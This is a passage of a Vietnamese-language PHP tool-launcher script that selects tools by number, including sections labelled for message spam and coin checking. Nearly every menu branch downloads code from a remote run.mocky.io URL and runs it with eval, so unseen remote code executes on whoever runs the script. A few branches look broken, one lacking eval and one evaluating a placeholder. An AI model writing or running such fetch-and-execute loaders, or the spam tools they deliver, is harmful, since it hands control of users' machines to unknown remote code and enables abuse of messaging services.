eval(file_get_contents('https://run.mocky.io/v3/166626fd-4999-4b2b-a462-7df5698037a8'));
} else if($chonloaitool == '38'){
eval(file_get_contents('https://run.mocky.io/v3/02bac8d8-4d5c-483a-a50c-ca00a10c6b0c'));
} else if($chonloaitool == '39'){
eval(file_get_contents('https://run.mocky.io/v3/541c6b82-9978-4681-a1e5-0db2eaec5dd9'));
} else if($chonloaitool == '40'){
eval(file_get_contents('https://run.mocky.io/v3/ebbbc00c-2a18-4efc-8895-d7bdcdcf189e'));
/////Tool Spam Message
} else if($chonloaitool == '2.8'){
eval(file_get_contents('https://run.mocky.io/v3/8eeed8f7-06c7-4494-bf6a-4351b427f0f2'));
} else if($chonloaitool == '2.9'){
eval(file_get_contents('https://run.mocky.io/v3/40bdbb11-4656-4389-9b61-d188982abb3f'));
//////Tool công cụ
} else if($chonloaitool == '41'){
eval(file_get_contents('https://run.mocky.io/v3/0c13602d-27e7-4a71-91a3-77262d1ef66e'));
} else if($chonloaitool == '42'){
eval(file_get_contents('https://run.mocky.io/v3/bd4ae10b-1b8b-4425-931c-20bf52871bbc'));
} else if($chonloaitool == '43'){
eval(file_get_contents('https://run.mocky.io/v3/f8ee4e1c-a3f6-40b3-84b8-d1815d3ac2e1'));
} else if($chonloaitool == '44'){
(file_get_contents('https://run.mocky.io/v3/8ef02e9b-7d84-4660-8ea3-b82fb0b59a47'));
} else if($chonloaitool == '45'){
eval(file_get_contents('xxxxx'));
} else if($chonloaitool == '46'){
eval(file_get_contents('https://run.mocky.io/v3/884c84f2-51bd-4e88-9ad8-edaf1760375b'));
} else if($chonloaitool == '47'){
eval(file_get_contents('https://run.mocky.io/v3/440d1fd8-682f-4628-869a-69c4c8e9475d'));
} else if($chonloaitool == '48'){
eval(file_get_contents('https://run.mocky.io/v3/4596c835-1178-46dd-b056-3f7004f3ccad'));
} else if($chonloaitool == '49'){
eval(file_get_contents('https://run.mocky.io/v3/157e9b25-a8bd-47c9-9a69-257c812d6ad9'));
} else if($chonloaitool == '50'){
eval(file_get_contents('https://run.mocky.io/v3/da50158d-79e2-45c3-81cd-aabf95d7bd78'));
} else if($chonloaitool == '51'){
eval(file_get_contents('https://run.mocky.io/v3/c2cc356c-0754-4b3c-a0a6-a3100db914d1'));
} else if($chonloaitool == '52'){
eval(file_get_contents('https://run.mocky.io/v3/7febf927-3dd5-4143-b5a5-add5bafb380e'));
} else if($chonloaitool == '53'){
eval(file_get_contents('https://run.mocky.io/v3/2177ccf4-df57-452b-8963-ca250ccb103c'));
//Tool Check xu
} else if($chonloaitool == '54'){
eval(file_get_contents('https://run.mocky.io/v3/3430a68b-9038-4667-b052-3abe15feb4fb'));
} else if($chonloaitool == '55'){
eval(file_get_contents('https://run.mocky.io/v3/db8becdc-0c01-4c70-a96b-4bf2b4c98971'));
} else if($chonloaitool == '56'){
eval(file_get_contents('https://run.mocky.io/v3/c3e875c9-c006-4e3a-a46f-4f826df85bd4'));
} else if($chonloaitool == '3.1'){
eval(file_get_contents('https://run.mocky.io/v3/f8ed6671-7a66-47ab-b4d4-dd82ed27e665'));
} else if($chonloaitool == '3.2'){
eval(file_get_contents('https://run.mocky.io/v3/8d4d38ae-2543-4dfe-8ea8-d727a50c5a4e'));
} else {
 echo"\033[1;31mLỗi Không Xác Định, Vui Lòng Thử Lại!!  \n";
    continue;
}
}#đóng while
/***[ FUNCTION ]***/
function get_sever_tool($url){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Vui lòng kiểm tra lại kết nối hoặc có thể do lỗi máy chủ!';
    }
    curl_close($ch);
    return $result;
}